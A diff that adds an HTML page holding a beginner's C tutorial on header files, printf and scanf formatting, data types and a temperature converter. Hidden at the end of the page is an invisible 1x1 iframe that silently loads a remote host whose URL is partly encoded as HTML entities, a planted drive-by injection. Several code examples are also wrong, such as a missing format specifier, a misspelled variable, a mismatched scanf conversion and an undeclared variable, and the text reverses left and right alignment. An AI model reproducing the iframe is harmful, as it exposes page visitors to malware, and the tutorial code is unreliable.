@@ -1,0 +1,425 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
+<META NAME="Generator" CONTENT="Microsoft Word 97">
+<TITLE>The C Programming Language Torn Apart</TITLE>
+</HEAD>
+<BODY LINK="#0000ff">
+
+<FONT SIZE=2>
+<B><P>The C Programming Language Torn Apart</P>
+</B>
+<P>Introduction: The evolution and Description of C</P>
+
+<P>The C programming language is a general purpose language which was originally designed for use on the Unix Operating System by Dennis Ritchie. The Unix Operating System, Unix Applications and Tools have been coded in C. This language has evolved from Ken Thompson's B language, which was the language designed for the first Unix System. </P>
+
+<P>C is not a machine specific language and a C program can easily be edited to make it work on various platforms. After the creation of the C programming language, over the years, C became the most preferred language amongst programmers around the world. Due to its immense popularity, many companies developed their own versions of the C compilers, added new features and commands etc This resulted in no specific standard followed by the various programs and led to utter confusion amongst programmers around the world. A need was felt to introduce a standard machine independent code which would be followed by all and make life a lot more easy for programmers.  So in 1983 the American National Standards Institute (ANSI) established a committee which aimed at doing just that. This series of manuals too is based on and follows ANSI standards.</P>
+
+<P>C is a high level language. By that what I mean to say is that the C commands or code is written in code which is easily understandable by humans. Its commands are infact plain English words and symbols. As a result C is non machine specific. C is not an interpreted language and unlike Perl a C program has to be first converted into Binary code with the help of a compiler. A compiler does just what the name suggests, compilation i.e. conversion of human understandable code into Binary machine understandable code.</P>
+
+<P>So, even before you can continue reading this manual, you need to get yourself a compiler. To compile C programs, even any C++ compiler would do. If you are a Windows user, then I suggest you get Visual C++, which is a part of Microsoft' s Visual Studio. Although it costs a lot, it is my favorite as it also gives you the benefit of using the MSDN Library. The other good compiler would be Borland C++ 5.5 (available for free download from: http://www.borland.com/bcppbuilder/freecompiler/ ) Then there is DJGPP which is available at:  </FONT><A HREF="http://www.delorie.com/djgpp/"><FONT SIZE=2>http://www.delorie.com/djgpp/</FONT></A><FONT SIZE=2>. </P>
+
+<P>If you are running any kind of Unix, then you have a C compiler in your disk itself. You  see, the cc and gcc utilities are actually C compilers. For more details, read Carolyn's GTMHH on C, at happyhacker.org</P>
+
+<P>The Standard C Header Library</P>
+
+<P>The ANSI C standard library is an exhaustive collection of pre written routines or functions that are needed by programmers in various applications again and again. Without the functions and routines contained by the header files, a program cannot work properly. Now instead of including the entire code of a long header file in each program , we declare the header files used by the program and reuse the routines contained by them. To understand header files better, read on.</P>
+
+<P>Let us take a practical example to see what actually happens when we try to display a string on the screen. Now to print something on the screen, without using any header file, we need to follow a very complex procedure. Firstly, we would need to extract the string to be printed from the program code, then look for the port in which the Standard Output device is installed, then send the string to that particular port, instructing the Standard Output Device what to do with the string. To write the entire set of above instructions in each C program we develop, would be really cumbersome and inefficient. That is why we use Header Files. With the use of Header Files, we can leave the coding of the entire above procedure to the Header File. With the use of Header Files, we no longer need to know how to communicate with certain Hardware, but instead simply need to know which routine or function to use. Header Files have a .h extension.</P>
+
+<P>The following is a complete list of header files which are a part of the Standard ANSI library-:</P>
+
+<P>&lt;stdio.h&gt;&#9;&#9;Standard Input \ Output</P>
+<P>&lt;assert.h&gt;&#9;&#9;Diagnostics</P>
+<P>&lt;ctype.h&gt;&#9;&#9;Character Handling</P>
+<P>&lt;errno.h&gt;&#9;&#9;Errors</P>
+<P>&lt;float.h&gt;&#9;&#9;Characteristics of Floating Types</P>
+<P>&lt;limits.h&gt;&#9;&#9;Sizes of Integral Types</P>
+<P>&lt;locale.h&gt;&#9;&#9;Localisation</P>
+<P>&lt;math.h&gt;&#9;&#9;Mathematics</P>
+<P>&lt;setjmp.h&gt;&#9;&#9;Non Local Jumps</P>
+<P>&lt;signal.h&gt;&#9;&#9;Signal Handling</P>
+<P>&lt;stdarg.h&gt;&#9;&#9;Variable Arguments</P>
+<P>&lt;stddef.h&gt;&#9;&#9;Common Definitions</P>
+<P>&lt;stdlib.h&gt;&#9;&#9;Commonly used General Utilities</P>
+<P>&lt;string.h&gt;&#9;&#9;String Handling</P>
+<P>&lt;time.h&gt;&#9;&#9;Date and Time</P>
+
+<P>NOTE: For the Time being, we are only concerned with the Standard I\O header file: stdio.h</P>
+
+<P>Like in the Perl Manual, we will start with the obligatory Hello World program which simply prints the text: Hello World on the screen. It is a big step in a novice's programming career and a person gets immense pleasure if his first program works without any problems. </P>
+
+<P>The following is the source of the Hello World Command. Before I analyze and explain each line of the program, study the program and try to figure out what each line does, then move on to my explanation and see how much you got right.  Self Learning can go a very long way. </P>
+
+<P>#include &lt;stdio.h&gt;</P>
+<P>main() {</P>
+<P>printf ("Hello World \n");</P>
+<P>}</P>
+
+<P>Output-:</P>
+
+<P>Hello World</P>
+
+<P>Now let us analyze the code snippet. The first line tells the computer to include information or commands and functions or routines from the header file: stdio.h which is needed to do anything regarding </P>
+<P>Input \ Output. The second line defines the function called main. The main function is a special function as it is this function, which by default starts automatically whenever a program is run. [NOTE: Other normal functions can be named anything we want them to be called. We will learn more about functions in upcoming manuals.] The empty brackets, the ( ), after main specify that the function main does not receive any arguments. A function contains certain statements or commands which are executed each time the particular function is called. Now, these statements are enclosed within curly brackets or braces. The '{ }'.</P>
+<P>In our first example, the function main has only one statement. </P>
+
+<P>So how does Hello World actually get printed on the screen? Well as soon as the function encounters the function 'printf', it gets the arguments contained by it i.e. the text within the brackets ( ). Then the program calls the printf function in the header file: stdio.h and passes it the values to be printed.</P>
+<P> </P>
+<P>The '\n' is the newline character which causes the Output Cursor to move to the first column of the next row or line. Let us see an example to understand how the newline character works.  Say, you want to modify your first C program such that it prints Hello on one line and World on the next line. Then the code would become:</P>
+
+<P>#include &lt;stdio.h&gt;</P>
+<P>main () {</P>
+<P>printf ("Hello");</P>
+<P>printf ("\n");</P>
+<P>printf ("World");</P>
+<P>}</P>
+
+<P>Output:</P>
+
+<P>Hello</P>
+<P>World</P>
+
+<P>Well, actually the same could be achieved with a smaller piece of code:</P>
+
+<P>#include &lt;stdio.h&gt;</P>
+<P>main () {</P>
+<P>printf ("Hello \n World");</P>
+<P>}</P>
+
+<P>Get it?  OK, now that you know what the basic structure of a C program is, let us learn some C routines in detail.</P>
+
+<P>The printf Routine: Printing Stuff</P>
+
+<P>The printf routine is a part of the Standard I\O Header file: stdio.h. It helps to display text, numbers and symbols in the specified format on the standard Output Device, which is normally your Monitor.</P>
+<P>The general syntax of the printf routine is:</P>
+
+<P>printf ("Characters", ARG1, ARG2…ARGn);</P>
+
+<P>where CHARACTERS is the string to be displayed on the screen. It can have upto 3 distinct escape character sequences, [I have discussed them later in this section.] in any combination. The ARGn is normally a variable whose value is printed on the screen. Confused? Well the following example, ought to clear all your doubts.</P>
+<P>Example:</P>
+
+<P>#include &lt;stdio.h&gt;</P>
+<P>main () {</P>
+<P>printf ("PIE=" , PIE);</P>
+<P>}</P>
+
+<P>Assuming that the value of the Variable PIE is 3.14, the output of the above would be:</P>
+
+<P>PIE= 3.14</P>
+
+<P>The following is a complete list of possible escape sequence characters which are a part of ANSI C:</P>
+
+<P>\a&#9;&#9;Alert Bell</P>
+<P>\b&#9;&#9;Backspace</P>
+<P>\f&#9;&#9;Form Feed</P>
+<P>\n&#9;&#9;New Line&#9;</P>
+<P>\r&#9;&#9;Carriage Return</P>
+<P>\t&#9;&#9;Horizontal Tab</P>
+<P>\v&#9;&#9;Vertical Tab</P>
+<P>\\&#9;&#9;Backslash</P>
+<P>\?&#9;&#9;Question Mark</P>
+<P>\'&#9;&#9;Single Quote</P>
+<P>\"&#9;&#9;Double Quotes</P>
+<P>\ddd&#9;&#9;Where ddd is an octal number and represents the ASCII code for the number</P>
+<P>\xdd&#9;&#9;Where ddd is a Hexa Decimal number and represents the ASCII code for the number</P>
+
+<P>Examples:</P>
+
+<P>printf  ("Is this a VIRUS ALERT \? \a");</P>
+
+<P>will print Is this a VIRUS ALERT ? on the screen and will sound a bell from the CPU Speaker.</P>
+
+<P>printf ("Ankit \t Fadia \n Fadia \t Ankit");</P>
+
+<P>will print the following on the screen:</P>
+
+<P>Ankit&#9;Fadia</P>
+<P>Fadia&#9;Ankit</P>
+
+<P>Formatting your Output using Printf Options</P>
+
+<P>This part might seem a bit weird to grasp, but I assure you, if you read the entire section, you will find it quite easy. You just need to try not give at half stage before reading the entire section.</P>
+
+<P>The general syntax of the printf formatting option is:</P>
+
+<P>%width[.precision] type</P>
+
+<P>where width is the minimum size of the field in which the characters (Output) has to be displayed. It is the number representing the minimum size of the field for displaying the output. The output is right justified unless the width is negative, in which case the output is right aligned. The width does not truncate the output, but accordingly increases its size, to accommodate the output.</P>
+
+<P>The Type can be anything from the below options-:</P>
+
+<P>&nbsp;</P>
+<P>d, i &#9;Decimal Number</P>
+<P>o&#9;unsigned Octal</P>
+<P>x, X&#9;unsigned Hexadecimal</P>
+<P>u&#9;unsigned Decimal Integer</P>
+<P>c&#9;Single Character</P>
+<P>s&#9;String</P>
+<P>f&#9;Floating Point Decimal</P>
+<P>g, G&#9;Floating Point Number in either fixed decimal or exponential form, </P>
+<P>e, E&#9;Floating Point Number in Exponential Form</P>
+
+<P>&nbsp;</P>
+<P>And the precision is the number of places which the output numeral of the Type will have. Like I said before, all this would definitely sound a bit too overwhelming for a complete newbie, but stick with me and keep reading the following examples and I assure you, all your doubts would be cleared.</P>
+
+<P>Examples:</P>
+
+<P>printf ("sum = %10d \n", result);</P>
+
+<P>if the value of the variable result is 145, then the output will be:</P>
+
+<P>sum = 145</P>
+
+<P>In this case, due to the format options we gave, the C program assumes that the value stored by the variable result is a decimal Number [Specified by d] and displays the output i.e. the vale of the variable result in a field of 10 characters wide. [ Specified by %10]. As the width in this example is positive, [10] the output is left aligned. Now let us say if we change the above line of code to the following:</P>
+
+<P>printf ("sum = %-10d \n", result);</P>
+
+<P>then everything else remains the same, only the output instead of being left aligned, is right aligned.</P>
+
+<P>printf ("Percentage =  %10.3f", percent);</P>
+
+<P>Assuming that the value of the variable percent is 2.345, the output will be:</P>
+
+<P>Percentage = 2.345</P>
+
+<P>Let's take a bit more complex example which includes escape Sequences.</P>
+
+<P>printf ("\t%2d:%2d  %c \n", hours, minutes, time);</P>
+
+<P>Assuming that the value of hours is 11, value of minutes is 45 and the value of time is PM, the output would be:</P>
+
+<P>&#9;11:45  PM</P>
+
+<P>Consider the following example:</P>
+
+<P>printf ("%s \t %6.2f \t", item, price);</P>
+
+<P>Assuming that the value of item is CD and the value of price is 100.25, then the output would be:</P>
+
+<P>CD&#9;100.25</P>
+
+<P>Well, till now I am sure almost all of you must be clear in your mind, as to how the printf function can be successfully used. However, if you still have any questions, feel free to contact me.</P>
+
+<P>Gathering Input: The scanf( ) routine</P>
+
+<P>Just like we have the printf( ) function to display output on the screen, we have the scanf( ) function to gather input from the user and to add interactivity to our programs. Before I move on to the syntax and other information on the scanf( ) routine, you need to understand the difference between a variable and the memory location of a variable.</P>
+
+<P>You see, whenever we declare a variable, the C program keeps a part a specific part of the memory for it. Now say we declare a variable and name it ankit and give it the null value i.e. nothing. Now when we give the following print command:</P>
+
+<P>printf ("Ankit's value is: %s", ankit);</P>
+
+<P>then the output would be:</P>
+
+<P>Ankit's value is: NULL</P>
+
+<P>Remember that the variable ankit has been assigned a memory location to store whatever value we want to assign it. Right? Well to refer to this memory location set apart of the variable ankit, we need to make use of the address operator i.e. the &amp; operator. So giving the following command will print the memory address assigned to the variable ankit:</P>
+
+<P>printf ("%s", &amp;ankit);</P>
+
+<P>Now that you know when the address operator is used, let us move on to the basic syntax of the scanf command:</P>
+
+<P>scanf ("Specification", addresses);</P>
+
+<P>where specification is a set of rules which decides the kind of input the program expects the User to type and addresses is a set of memory locations to which the Input is to be stored. </P>
+
+<P>The specification part is nothing but the formatting options which the printf( ) routine has. It decides whether the program is looking for decimals, floating points or characters as input. It also decides the maximum number of characters which can be accepted as input. Basically the syntax of Specification is as follows: </P>
+
+<P>%[width] type</P>
+
+<P>where width specifies the maximum number of characters which can be accepted as input. If the User tries to input more number of characters than specified by width, the program does not accept them and the input cursor does not move ahead. </P>
+
+<P>Type can be anything from the following list of values-:</P>
+
+<P>&nbsp;</P>
+<P>d,&#9;Signed Decimal Number</P>
+<P> i &#9;Signed Integer whose base(Type of Number System) is decided by the format of the number input:</P>
+<P>&#9;If the prefix is 0 it expects an octal integer</P>
+<P>&#9;If prefix is 0x then it expects a Hexadecimal Integer</P>
+<P>&#9;Else if there is no prefix, then it expects a decimal integer</P>
+<P>c&#9;Character</P>
+<P>s&#9;String</P>
+<P>o&#9;unsigned Octal</P>
+<P>x, X&#9;unsigned Hexadecimal</P>
+<P>u&#9;unsigned Decimal Integer</P>
+<P>e, f , g &#9;Signed Floating Point Value</P>
+<P>l&#9;This is used to prefix e, f, g  and signifies a long integer  or unsigned long integer</P>
+<P>L&#9;This is used to prefix e, f, g and signifies a long double&#9;</P>
+
+<P>&nbsp;</P>
+<P>Let us take some examples to make this routine clearer.</P>
+<P>Examples: </P>
+
+<P>scanf ("%d", &amp;pie);</P>
+
+<P>will take a decimal from User Input and store it in the address of the variable ' pie '.</P>
+
+<P>scanf ("%10s", &amp;name);</P>
+
+<P>will take the first 10 characters from the User Input and store them in the address of the variable ' name '.</P>
+
+<P>scanf ("%d%c%lx", &amp;dec, &amp;stringvar, &amp;longvar);</P>
+
+<P>will take a decimal integer, a single character and an unsigned Long Hexadecimal number and assigns them to the addresses of the variables dec, stringvar and longvar.</P>
+
+<P>NOTE: Please, note the Address Operator before the variable name in each of the above examples. Without the use of this operator the program will not work and the variable will not be assigned any value. Somehow, we do not need to use the Address Operator while printing the value stored by a variable. Just remember that while using scanf, you need to use the address operator and with printf, no address operator needs to be used. There is no need to go deep into the reasons behind this.</P>
+
+<P>Wasn't that easy? Well C is not as difficult as it is projected to be and I am sure all experienced C programmers agree with me on that fact. Anyway, till now we have learnt how to print the value stored by a variable and also how to get input from the user and assign it to a variable. But, these routines are of no use if we do not know how to declare variables. In C, we cannot declare and assign values to variables at the same time. You need to first declare a variable and only then can you assign it a value. So let us know learn how to do just that.</P>
+
+<P>Variables</P>
+
+<P>In C, all variables must be declared before they can be used or assigned a value. Variables are usually declared in the beginning of a function i.e. before any executable commands or routines start. A variable declaration is of the following format:</P>
+
+<P>Variable_Type   Variable_Name</P>
+
+<P>where Variable_Type is the type is the type of variable, which symbolizes the type of data stored by the declared variable(int, char, float etc) , and Variable_Name is the name of the variable being declared.</P>
+<P>A typical variable declaration would be:</P>
+
+<P>int number;</P>
+
+<P>The above line declared a variable by the name number and declared it to store an integer. We can declare more than a single same type of variable in a single line:</P>
+
+<P>int number, number1, number2;</P>
+
+<P>This line declares three Integer variables: number, number1 and number2.</P>
+
+<P>C supports the following basic data types:</P>
+
+<P>int&#9;Integer</P>
+<P>float&#9;Floating Point (Numbers having a fractional Part)</P>
+<P>char&#9;Single Character (Single Byte like a, b, c etc)</P>
+<P>short&#9;Short Integer</P>
+<P>long&#9;Long Integer</P>
+<P>double&#9;Double Integer</P>
+
+<P>NOTE: The range of int and float varies from system to system. And these are not the only kind of data types. We still have arrays, pointers, structures etc which we will discuss later.</P>
+
+<P>Now, that we have learnt how to declare variables, we need to know how to assign values to them. Well, to assign values to variables, we use the assignment operator, i.e. The ' = ' operator.</P>
+<P>For example,</P>
+
+<P>int number;</P>
+<P>number = 20;</P>
+
+<P>declares a variable by the name number and type Integer and then the second line assigns it the value 20.</P>
+
+<P>My First Useful Working Program</P>
+
+<P>Now that we know a bit about I\O and also a bit about variables, we are in a position of creating out first useful working C program!!!. This program will ask the user to type the temperature in Fahrenheit and will convert it into Celsius and print the result on the screen. However before we move on, we need to cover a tiny detail: Comments. Anything between a '  /*  '  and a '  */ ' is called a comment and is ignored by the compiler. They are inserted so that people find it easier to read the code and understand what each line is meant to do. The following example, has a lot of comments.</P>
+
+<P>#include &lt;stdio.h&gt;   /* Include the Standard I/O Header File */</P>
+
+<P>main() {                  /*Start the Main Function, which is executed automatically */</P>
+
+<P>    int fah, cel;&#9;/* Declare the (int) variables which will hold the Fahrenheit and Celsius Equivalents */</P>
+
+<P>    printf ("Enter Temperature in Fahrenheit:");     /* Hello User. I am hungry, feed me a value */</P>
+<P>    scanf ("%d",  &amp;fah);                                          /* Get the User Input and store it in the address of fah  */</P>
+<P>    cel = (Fah -32) * 5 / 9;&#9;&#9;&#9;       /* Get the Grey Cells Working, convert input to Celsius */</P>
+<P>    printf ("\n \n Temperature in Celsius is….%3d", cel);                                /* Give User What He wants */</P>
+<P>}</P>
+
+<P>Output: </P>
+
+<P>Enter Temperature in Fahrenheit: 32</P>
+
+<P> Temperature in Celsius is…. 0</P>
+
+<P>Wow!!! Wasn't that a kewl program? Well, at least a kewl enough for a C newbie. Anyway, now we come to the Examples Section of the Manual, which consists of a collection of important examples, which make life easier for a newbie C programmer by helping him to learn better. Also comments have been provided where ever necessary.</P>
+
+<P>The following example illustrates the use of all kinds of data types with the printf( ) and scanf( )routines.</P>
+
+<P>#include &lt;stdio.h&gt;</P>
+
+<P>main() {</P>
+
+<P>int  &#9;inum;</P>
+<P>float &#9;fnum;</P>
+<P>double    dnum;</P>
+<P>long int  lnum;</P>
+
+<P>printf ("Enter An Integer:");</P>
+<P>scanf ("%d", &amp;inum);</P>
+<P>printf ("Enter a Floating Point Number:");</P>
+<P>scanf ("%10f", &amp;fnum);</P>
+<P>printf ("Enter a Double Value Number:");</P>
+<P>scanf ("%le", &amp;dnum);</P>
+<P>printf ("Enter a Hexadecimal unsigned Integer:");</P>
+<P>scanf ("%le", &amp;lnum);</P>
+
+<P>printf ("inum = %-5d\n", inum);</P>
+<P>printf ("fnum = %10.4f\n", fnum);</P>
+<P>printf ("dnum = %15.4e\n", dnum);</P>
+<P>printf ("lnum = %lx \n", lnum);</P>
+
+<P>}</P>
+
+<P>Output:</P>
+
+<P>Enter An Integer: 123409</P>
+<P>Enter a Floating Point Number: 1.546789</P>
+<P>Enter a Double Value Number: 9.879054678E-15</P>
+<P>Enter a Hexadecimal unsigned Integer: B543</P>
+<P>inum =123409</P>
+<P>fnum =1.546789</P>
+<P>dnum = 9.879054678E-15</P>
+<P>lnum = B543</P>
+
+<P>Remember that I told you that the float and integer value ranges differ from system to system. Now the following program demonstrates how to get and print these ranges. All these ranges are given in the &lt;float.h&gt; and &lt;limits.h&gt; header files, so we need to include them too.</P>
+
+<P>#include &lt;stdio.h&gt;</P>
+<P>#include &lt;limits.h&gt;</P>
+<P>#include &lt;float.h&gt;</P>
+
+<P>main() {</P>
+<P>char &#9;char_min, char_max, char_unsigned_max;</P>
+<P>int&#9;int_min, int_max, int_unsigned_max;</P>
+<P>long int&#9;long_int_min, long_int_max, long_int_unsigned;</P>
+<P>float&#9;float_min, float_max;</P>
+<P>double&#9;double_min, double_max;</P>
+
+<P>char_min = SCHAR_MIN;</P>
+<P>char_max = SCHAR_MAX;</P>
+<P>char_unsigned_max = UCHAR_MAX;</P>
+
+<P>printf ("Char Min: %d\n", char_min);</P>
+<P>printf ("Char Max: %d\n", char_max);</P>
+<P>printf ("Char unsigned Max: %u\n\n", char_unsigned_max);</P>
+
+<P>int_min = INT_MIN;</P>
+<P>int_max = INT_MAX;</P>
+<P>int_unsigned_max = UINT_MAX;</P>
+
+<P>printf ("Int Min: %d\n", int_min);</P>
+<P>printf ("Int Max: %d\n", int_max);</P>
+<P>printf ("Int unsigned Max: %u\n\n", int_unsigned_max);</P>
+
+<P>long_int_min = LONG_MIN;</P>
+<P>long_int_max = LONG_MAX;</P>
+<P>long_int_unsigned_max = ULONG_MAX;</P>
+
+<P>printf ("long Int Min: %ld\n", long_int_min);</P>
+<P>printf ("long Int Max: %ld\n", long_int_max);</P>
+<P>printf ("long Int unsigned Max: %lu\n\n", long_int_unsigned_max);</P>
+
+<P>float_min = FLT_MIN;</P>
+<P>float_max = FLT_MAX;</P>
+
+<P>printf ("Float Min: %15.9e\n", float_min);</P>
+<P>printf ("Float Max: %15.9e\n\n", float_max);</P>
+
+<P>double_min = DBL_MIN;</P>
+<P>double_max = DBL_MAX;</P>
+
+<P>printf ("Double Min: %25.16e\n", double_min);</P>
+<P>printf ("Double Max: %25.16e\n\n", double_max);</P>
+
+<P>}</P>
+
+<P>Try out the above program on your machine to find out the ranges of data types(chat, int, float, double, long int) on your system. Well that is all for this week's C manual, see you next time.</P>
+
+<P>Ankit Fadia</P>
+<P></FONT><A HREF="mailto:Ankit@bol.net.in"><FONT SIZE=2>ankit@bol.net.in</FONT></A><FONT SIZE=2> or </FONT><A HREF="mailto:programmers@techbroker.com"><FONT SIZE=2>programmers@techbroker.com</FONT></A></P>
+<FONT SIZE=2><P></FONT><A HREF="http://hackingtruths.tripod.com/"><FONT SIZE=2>http://hackingtruths.tripod.com</FONT></A><FONT SIZE=2>   [The Hacking Truths Archive]</P>
+</FONT><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
